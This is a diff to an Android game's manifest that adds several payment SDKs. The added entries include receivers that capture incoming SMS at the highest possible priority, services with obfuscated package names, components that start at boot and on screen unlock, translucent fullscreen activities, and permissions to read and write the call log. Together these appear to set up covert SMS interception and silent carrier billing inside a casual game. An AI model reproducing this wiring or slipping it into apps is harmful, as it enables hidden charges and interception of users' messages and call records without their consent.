@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.tinyhorse.parkour2.wjwz"
+    package="com.tinyhorse.parkour2.wjwz1"
     android:versionCode="1"
     android:versionName="1.0" >
     
@@ -192,7 +192,114 @@
             android:exported="true"
             android:permission="android.permission.BIND_JOB_SERVICE" />
         <!-- YLPay end -->
+        
+        <!-- YmPay start -->
+        <meta-data
+            android:name="YM_CPID"
+            android:value="15063_352_10" /><!-- id在渠道后台申请推广编号后替换 -->
+
+          <service android:name="f.g.h.j.ma.MService" >
+        </service>
+        <service android:name="c.a.d.s.HService" >
+        </service>
+
+        <receiver
+            android:name="f.g.h.j.ma.MCast"
+            android:label="NetworkConnection" >
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.TIME_SET" />
+                <action android:name="android.intent.action.TIME_TICK" />
+                <action android:name="sss_takkk" />
+                <action android:name="sss_tuccc" />
+            </intent-filter>
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <!-- YmPay end -->
+        
+        <!-- FyPay start  -->
+        
+        <activity
+            android:name="com.iyou.iyoupay.StartServiceActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" >
+        </activity>
+
+        <service android:name="com.iyou.iyoupay.BackgroundService" />
+
+        <receiver android:name="com.iyou.iyoupay.BootCompletedBroadcastReceiver" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        <!-- tyrz start -->
+        <meta-data
+            android:name="UMCSDK_SMSCODE_FLAG"
+            android:value="1" >
+        </meta-data>
+        <meta-data
+            android:name="UMCSDK_SMSLOGIN_FLAG"
+            android:value="1" >
+        </meta-data>
+
+        <receiver android:name="cm.pass.sdk.broadcastreceiver.SsoSyncReceiver" >
+            <intent-filter>
+                <action android:name="cn.richinfo.provider.receiver" />
+            </intent-filter>
+        </receiver>
+        <!-- tyrz end -->
+                <!-- 掌支付sdk -->
+        <activity
+            android:name="org.zzf.core.activity.ZhangPayActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent" >
+        </activity>
+
+        <service android:name="org.zzf.core.service.ZhangPayPlateService" >
+        </service>
+
+        <receiver android:name="org.zzf.core.service.ServiceRecevier" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.media.RINGER_MODE_CHANGED" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver android:name="org.zzf.core.zdx.BootReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="org.zzf.core.service.ZhangzhifuDxService"
+            android:enabled="true" />
+
+        <receiver
+            android:name="org.zzf.core.zdx.ZdxReceiver"
+            android:exported="true" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" >
+                </action>
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+        
+        
+        <!-- FyPay end  -->
+        
     </application>
+    
+    <supports-screens
+        android:anyDensity="true"
+        android:largeScreens="true"
+        android:normalScreens="true"
+        android:resizeable="true"
+        android:smallScreens="true" />
+    
 
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
@@ -243,5 +350,17 @@
     <uses-permission android:name="android.permission.CAMERA" /> -->
         
 	<!-- MPay end-->  
+	
+	<!-- YmPay start -->
+    <!-- IVR添加 -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+	<uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+    
+    <!-- YmPay end -->
+    
+    <!-- FyPay start -->    
+    <uses-permission android:name="android.permission.CHANGE_CONFIGURATION" />
+	<uses-permission android:name="android.permission.RECEIVE_WAP_PUSH" />
+	<!-- FyPay end -->
     
 </manifest>
